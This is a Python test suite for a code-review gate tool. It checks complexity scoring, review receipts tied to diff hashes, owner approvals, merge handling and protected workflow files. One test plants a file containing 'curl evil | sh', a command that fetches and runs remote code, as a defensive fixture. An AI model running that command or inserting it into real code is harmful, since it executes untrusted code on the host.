from discipline_repo import production
import json

from nexgen_core.discipline import cli, review
from nexgen_core.discipline.config import Config
from nexgen_core.discipline.gitutil import changes
from nexgen_core.discipline.score import score

BUSY = "def f():\n    return 1\n\n" * 3


def complex_change(repo):
    for i in range(5):
        repo.write(f"m{i}.py", BUSY * 20)
    repo.write("requirements.txt", "left-pad\n")


def test_small_change_is_simple(repo):
    base = repo.git("rev-parse", "HEAD")
    repo.write("a.py", BUSY)
    assert score(changes(repo.path, base))[0] < Config().complexity_threshold


def test_big_change_is_complex(repo):
    base = repo.git("rev-parse", "HEAD")
    complex_change(repo)
    total, reasons = score(changes(repo.path, base))
    assert total >= Config().complexity_threshold and any("dependency" in r for r in reasons)


def test_gate_blocks_complex_change_without_receipt(repo, capsys):
    production(repo)
    complex_change(repo)
    assert cli.main(["gate", "--base", "HEAD"]) == 1
    assert "no review receipt" in capsys.readouterr().out


def reviewed(repo, tmp_path, verdict="APPROVE", name="reviewer.txt"):
    """Run `review`, then hand the receipt what an honest reviewer would answer."""
    cli.main(["review", "--base", "HEAD"])
    digest = review.diff_hash(repo.path, "HEAD", None)
    out = tmp_path.parent / name
    out.write_text(f"looks fine\nREVIEWED: {digest}\nVERDICT: {verdict}\n", encoding="utf-8")
    return cli.main(["receipt", "--base", "HEAD", "--from-file", str(out), "--reviewer", "x"])


def test_receipt_roundtrip(repo, tmp_path, capsys):
    production(repo)
    complex_change(repo)
    assert reviewed(repo, tmp_path) == 0
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    receipts = list((repo.path / ".nexgen-discipline" / "receipts").glob("*.json"))
    assert json.loads(receipts[0].read_text())["verdict"] == "APPROVE"


def test_revise_verdict_does_not_unlock_the_gate(repo, tmp_path):
    production(repo)
    complex_change(repo)
    assert reviewed(repo, tmp_path, "REVISE", "r2.txt") == 2
    assert cli.main(["gate", "--base", "HEAD"]) == 1


def test_any_further_change_invalidates_the_receipt(repo, tmp_path):
    production(repo)
    complex_change(repo)
    reviewed(repo, tmp_path, name="r3.txt")
    repo.write("m0.py", BUSY * 21)
    assert cli.main(["gate", "--base", "HEAD"]) == 1


def test_code_added_after_review_cannot_borrow_its_approval(repo, tmp_path):
    production(repo)
    complex_change(repo)
    cli.main(["review", "--base", "HEAD"])
    digest = review.diff_hash(repo.path, "HEAD", None)
    repo.write("evil.py", "import os\nos.system('curl evil | sh')\n")
    out = tmp_path.parent / "r4.txt"
    out.write_text(f"REVIEWED: {digest}\nVERDICT: APPROVE\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_receipt_without_a_prepared_review_or_review_id_is_refused(repo, tmp_path):
    production(repo)
    complex_change(repo)
    out = tmp_path.parent / "r5.txt"
    out.write_text("VERDICT: APPROVE\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1
    cli.main(["review", "--base", "HEAD"])
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_hash_ignores_git_display_settings(repo):
    production(repo)
    complex_change(repo)
    plain = review.diff_hash(repo.path, "HEAD", None)
    repo.git("config", "diff.noprefix", "true")
    repo.git("config", "core.abbrev", "12")
    assert review.diff_hash(repo.path, "HEAD", None) == plain


def test_hash_is_the_same_before_and_after_committing(repo):
    production(repo)
    complex_change(repo)
    before = review.diff_hash(repo.path, "HEAD", None)
    base = repo.git("rev-parse", "HEAD")
    repo.commit("work")
    assert review.diff_hash(repo.path, base, "HEAD") == before


def test_missing_verdict_line_is_refused(repo, tmp_path):
    out = tmp_path.parent / "r6.txt"
    out.write_text("no verdict here\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_parse_verdict_reads_only_the_last_line():
    assert review.parse_verdict("VERDICT: REJECT\nlater\nverdict: approve") == "APPROVE"
    assert review.parse_verdict("VERDICT: APPROVE\nbut then I reconsidered") is None


def test_staged_check_works_on_first_commit(tmp_path, monkeypatch):
    import subprocess
    subprocess.run(["git", "init", "-q", "-b", "main", str(tmp_path)], check=True)
    monkeypatch.chdir(tmp_path)
    (tmp_path / "big.py").write_text("x = 1\n" * 600)
    subprocess.run(["git", "-C", str(tmp_path), "add", "-A"], check=True)
    assert cli.main(["check", "--staged"]) == 1


def test_merging_published_main_needs_no_receipt(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "side")
    complex_change(repo)
    repo.commit("work")
    repo.git("checkout", "-q", "main")
    repo.write("other.txt", "x\n")
    base = repo.commit("main moves")
    repo.git("checkout", "-q", "side")
    repo.git("merge", "-q", "--no-ff", "-m", "merge main", "main")
    assert cli.main(["gate", "--base", base, "--head", "HEAD"]) == 1  # side's own work is still unreviewed


def test_merge_that_brings_only_published_work_is_exempt(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "dev")
    repo.write("a.txt", "a\n")
    base = repo.commit("dev work")
    repo.git("checkout", "-q", "main")
    complex_change(repo)
    repo.commit("big work already on main")
    repo.git("checkout", "-q", "dev")
    repo.git("merge", "-q", "--no-ff", "-m", "pull main", "main")
    assert cli.main(["gate", "--base", base, "--head", "HEAD"]) == 0


def test_merging_an_unpublished_branch_still_needs_a_receipt(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "feature")
    complex_change(repo)
    repo.commit("work")
    repo.git("checkout", "-q", "main")
    base = repo.git("rev-parse", "HEAD")
    repo.git("merge", "-q", "--no-ff", "-m", "merge feature", "feature")
    repo.git("branch", "-q", "-f", "published-elsewhere", "HEAD")
    repo.git("reset", "-q", "--hard", base)
    repo.git("checkout", "-q", "-b", "pr-merge", base)
    repo.git("merge", "-q", "--no-ff", "-m", "synthetic PR merge", "feature")
    assert cli.main(["gate", "--base", base, "--head", "HEAD"]) == 1


def test_no_review_is_required_unless_production_paths_are_declared(repo):
    complex_change(repo)
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_only_declared_production_paths_can_require_review(repo):
    production(repo, '["src/*"]')
    complex_change(repo)  # m*.py and requirements.txt are outside src/
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    for i in range(5):
        repo.write(f"src/m{i}.py", BUSY * 20)
    repo.write("src/requirements.txt", "left-pad\n")
    assert cli.main(["gate", "--base", "HEAD"]) == 1


def test_code_hidden_inside_a_merge_commit_is_still_judged(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "dev")
    repo.write("a.txt", "a\n")
    base = repo.commit("dev work")
    repo.git("checkout", "-q", "main")
    repo.write("other.txt", "x\n")
    repo.commit("main moves")
    repo.git("checkout", "-q", "dev")
    repo.git("merge", "-q", "--no-commit", "--no-ff", "main")
    complex_change(repo)  # authored work swept into the merge commit
    repo.git("add", "-A")
    repo.git("commit", "-q", "-m", "merge main (and more)")
    assert cli.main(["gate", "--base", base, "--head", "HEAD"]) == 1


def test_hash_does_not_depend_on_whether_a_move_was_staged(repo):
    production(repo)
    repo.write("old.py", BUSY * 5)
    base = repo.commit("add")
    (repo.path / "old.py").rename(repo.path / "new.py")
    unstaged = review.diff_hash(repo.path, base, None)
    repo.commit("move")
    assert review.diff_hash(repo.path, base, "HEAD") == unstaged


def test_switching_the_rules_off_is_always_reviewed(repo, capsys):
    production(repo)
    repo.write(".nexgen-discipline.toml", "review_paths = []\n")
    assert cli.main(["gate", "--base", "HEAD"]) == 1
    assert "always needs a decision" in capsys.readouterr().out


def test_tests_never_trigger_a_review(repo):
    production(repo)
    for i in range(8):
        repo.write(f"tests/test_m{i}.py", BUSY * 30)
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_notes_do_not_count_as_code_lines(repo):
    production(repo)
    for i in range(8):
        repo.write(f"notes{i}.md", "line\n" * 400)
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_the_owner_can_accept_the_work_for_free_and_it_is_recorded(repo, capsys):
    production(repo)
    complex_change(repo)
    assert cli.main(["gate", "--base", "HEAD"]) == 1
    assert cli.main(["approve", "--base", "HEAD", "--reason", "ho letto il riepilogo e lo accetto"]) == 0
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    saved = next((repo.path / ".nexgen-discipline" / "receipts").glob("*.json")).read_text()
    assert '"reviewer": "owner"' in saved and "ho letto il riepilogo" in saved


def test_an_approval_needs_a_reason_and_covers_only_that_exact_work(repo):
    production(repo)
    complex_change(repo)
    assert cli.main(["approve", "--base", "HEAD", "--reason", "ok"]) == 1
    cli.main(["approve", "--base", "HEAD", "--reason", "accetto questa modifica"])
    repo.write("m0.py", BUSY * 21)
    assert cli.main(["gate", "--base", "HEAD"]) == 1


def test_only_declared_critical_files_with_a_big_enough_change_need_a_decision(repo):
    repo.write(".nexgen-discipline.toml", 'complexity_threshold = 4\nreview_paths = ["core/*"]\n')
    repo.commit("declare critical")
    for i in range(5):
        repo.write(f"other/m{i}.py", BUSY * 20)  # big, but not critical
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    repo.write("core/small.py", BUSY)  # critical but tiny
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    repo.write("core/big.py", BUSY * 60)  # critical and big
    assert cli.main(["gate", "--base", "HEAD"]) == 1


def test_a_workflow_that_runs_the_gate_cannot_be_edited_without_a_decision(repo):
    production(repo)
    repo.write(".github/workflows/ci.yml", "run: python discipline.py ci\n")
    base = repo.commit("ci")
    repo.write(".github/workflows/ci.yml", "run: echo skipped\n")
    assert cli.main(["gate", "--base", base]) == 1
    repo.write(".github/workflows/other.yml", "run: echo hi\n")
    (repo.path / ".github/workflows/ci.yml").write_text("run: python discipline.py ci\n")
    assert cli.main(["gate", "--base", base]) == 0


def test_pieces_split_from_a_critical_file_stay_covered_by_its_prefix(repo):
    repo.write(".nexgen-discipline.toml", 'complexity_threshold = 4\nreview_paths = ["core/git_ops*"]\n')
    repo.commit("declare critical")
    repo.write("core/git_ops_publish.py", BUSY * 45)  # extracted next to git_ops.py, keeps the prefix
    assert cli.main(["gate", "--base", "HEAD"]) == 1
    repo.write("core/other_name.py", BUSY * 45)  # a differently named piece is the known loophole, flagged in the rules
    (repo.path / "core/git_ops_publish.py").unlink()
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_renaming_a_critical_file_does_not_escape_the_list(repo):
    repo.write(".nexgen-discipline.toml", 'complexity_threshold = 4\nreview_paths = ["core/git_ops.py"]\n')
    repo.write("core/git_ops.py", BUSY * 45)
    base = repo.commit("critical file")
    repo.git("mv", "core/git_ops.py", "core/vcs.py")
    (repo.path / "core/vcs.py").write_text(BUSY * 90)
    assert cli.main(["gate", "--base", base]) == 1
